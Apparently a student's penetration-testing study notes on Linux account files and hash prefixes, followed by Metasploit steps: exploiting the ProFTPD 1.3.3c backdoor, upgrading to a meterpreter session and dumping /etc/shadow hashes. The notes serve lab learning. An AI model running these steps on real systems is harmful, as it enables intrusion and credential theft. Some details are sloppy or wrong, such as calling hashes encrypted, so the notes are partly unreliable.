* Linux has multi-user support --> advantage and disadvantage at the same time
* **Where is all the information for all accounts on Linux is stored**
* `/etc/passwd`

* **Where are all the encrypted passwords stored**
* `/etc/shadow/`

* **Which is the only account that can access and read the shadow file**
* 'root' account

* **In the passwd file, what is the significance of the number after the usernmae encapsulated by $ sign**
  * It denotes the types of hashing algorithm to generate hashes for the passwords
  * $1 = MD5
  * $2 = Blowfish
  * $5 = SHA-256
  * $6 = SHA-512

  ### PRACTICAL
  * `use exploit/unix/ftp/proftpd_133c_backdoor` --> 
  * `setg rhosts [Target IP]`
  * `run` --> This should provide a command shell which we can esclate to a meterpreter session
  *  `ctrl + z` --> to exit the command shell
  *  'sessions` --> Lsit the current sessions
  *  'sessions - [ID of the session in the above list]` --> Upgrades the session
  *  The above command can throw some errors but it is ok as long as we can obtain a meterpreter session
  *  `session [ID in the list running meterpreter session]`
  *  **To dump the hashes Method 1** --> `cat /etc/shadow`
  *  **To dump the hashes Method 2** --> `use post/linux/gather/hashdump` --> `set session [ID of the meterpreter session]`
  *  **To find plain text passwords of the users** --> `
  *  We can notice if the root hash starts with $6 --> which would mean that it is encrypted using the SHA-512 algorithm.
  *  User accounts --> Starts with a hash code  **Service accounts** --> Starts with *
 
* **Extraz** -->
  * Why start Postgresql with msfconsole
    *  start the postgresql database server on the attacker machine. We are starting postgresql to store all metasploit loot and other sensitive information from the target machine.
